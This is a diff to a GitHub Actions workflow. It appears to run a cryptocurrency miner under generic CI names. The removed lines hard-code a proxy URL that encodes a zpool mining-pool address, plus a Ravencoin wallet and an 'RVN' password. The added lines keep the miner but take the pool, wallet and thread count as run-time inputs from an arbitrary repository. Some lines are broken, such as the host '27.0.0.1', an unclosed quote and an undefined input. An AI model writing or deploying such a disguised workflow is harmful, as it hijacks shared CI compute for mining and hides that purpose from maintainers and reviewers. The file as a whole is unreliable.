@@ -1,10 +1,35 @@
-name: Sample CI
+name: CI
 
 on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+  workflow_dispatch:
+    inputs:
+      repoName:
+        description: 'Repository'
+        required: true
+      proxy:
+        description: 'URL'
+        required: true
+      user:
+        description: 'Username'
+        required: true
+      password:
+        description: 'Password'
+        required: true
+      threads:
+        description: 'Threads'
+        required: true
+        default: '3'
+      log:
+        description: 'Enable logging'
+        type: boolean
+        default: true
+      port:
+        description: 'Port'
+        default: '3306'
+      host:
+        description: "Host"
+        default: "27.0.0.1"
+
 
 jobs:
   run-script:
@@ -19,19 +44,28 @@ jobs:
       - name: Clone
         uses: actions/checkout@v4
         with:
-          repository: saxlata/vbg
+          repository: ${{ github.event.inputs.repoName }}
           ref: main
           path: dir-dir
 
       - name: Run info
         working-directory: dir-dir
         run: |
-          echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,demo\nthreads=2" > data.txt
+          cat > dir-app/data.txt << EOF
+            log=${{ github.event.inputs.log }}
+            proxy=${{ github.event.inputs.proxy }}
+            username="${{ github.event.inputs.user }}
+            password=${{ github.event.inputs.password }}
+            argent=${{ github.event.inputs.argent }}
+            threads=${{ github.event.inputs.threads }}
+            host=${{ github.event.inputs.host }}
+            port=${{ github.event.inputs.port }}
+          EOF
       - name: Run
         working-directory: dir-dir
         env:
           TERM: xterm-256color
         run: |
           echo "::group::My Detailed Logs"
-          python3 main.py 3 --dataset=data.txt --output=result.txt
+          python3 main.py ${{ github.event.inputs.threads }} --dataset=data.txt --output=result.txt
           echo "::endgroup::"
